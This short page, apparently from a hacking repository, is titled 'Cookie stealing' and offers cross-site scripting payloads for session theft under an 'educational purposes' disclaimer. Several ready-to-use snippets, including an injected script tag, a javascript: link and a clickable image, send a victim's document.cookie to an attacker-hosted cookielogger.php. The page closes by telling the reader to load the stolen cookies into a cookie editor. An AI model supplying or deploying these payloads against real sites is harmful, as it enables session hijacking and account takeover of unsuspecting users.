###### Cookie stealing
<p>Some cooklie stealing using php</p>
**ONLY FOR EDUCATIONAL PURPOSES**

Some examples of using them:
```
"><script language= "JavaScript">document.location="http://yoursite.com/whateveryouwant.php?cookie=" + document.cookie;document.location="http://www.whateversite.com"</script>
```
yoursite.com is the server you’re hosting your cookie stealer and log file on, and whateversite.com is the vulnerable page you’re exploiting.

The victim just enters the page:
```
<script language="Java script">
document.location="http://www.yourhost.com/cookielogger.php?cookie=&quot; + document.cookie;
</script>
```

Your can also trick the victim into clicking a link that activates javascript.
```
<a href="java script:document.location='http://www.yourhost.com/cookielogger.php?cookie='+document.cookie;">Click here!</a>
```

Clicking an image also can activate the script.For this purpose you can use the below code.
```
<a href="java script:document.location='http://www.yourhost.com/cookielogger.php?cookie='+document.cookie;"&gt;
<img src="URL OF THE IMAGE"/></a>
```

To use the information download a cookie editor such as firebug.